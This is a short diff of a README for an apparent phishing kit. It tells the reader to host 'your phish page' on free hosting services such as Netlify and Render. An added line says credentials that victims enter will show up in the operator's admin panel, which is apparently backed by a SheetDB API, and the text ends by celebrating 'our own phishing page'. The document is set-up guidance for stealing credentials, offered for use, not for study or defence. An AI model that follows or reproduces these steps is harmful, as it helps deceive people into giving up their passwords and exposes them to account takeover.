@@ -58,12 +58,13 @@ and replace with your  **sheetdb** api.
 
 **All done.....**
 
-Now host **Admin-wssix** folder and **client** folder separately.
+Now host your phish page.
+
 For hosting : 
 
 - [**Netlify**](https://netlify.com/)
 - [**Render**](https://render.com/)
-
+### whenever someone enter creadentials on your page, you can access it on your admin panel. 
 ### Now! we have our own phishing page
 
 ## **How this work!!**
